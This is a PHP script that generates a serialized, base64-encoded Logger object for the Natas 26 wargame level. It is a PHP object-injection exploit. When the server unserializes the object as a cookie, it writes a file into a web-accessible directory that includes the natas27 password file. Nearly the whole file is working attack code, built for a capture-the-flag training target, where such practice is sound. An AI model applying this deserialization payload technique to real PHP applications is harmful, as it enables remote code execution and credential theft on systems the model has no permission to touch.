<html>
<head>
<body>
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="init";
            $this->exitMsg="<?php include('/etc/natas_webpass/natas27') ?>";
            $this->logFile ="/var/www/natas/natas26/img/testing.php";

            // write initial message
            //$fd=fopen($this->logFile,"a+");
            //fwrite($fd,$initMsg);
            //fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            //$fd=fopen($this->logFile,"a+");
            //fwrite($fd,$this->exitMsg);
            //fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

$drawing = new Logger("test");
echo(base64_encode(serialize($drawing)));
?>
</body>
</html>
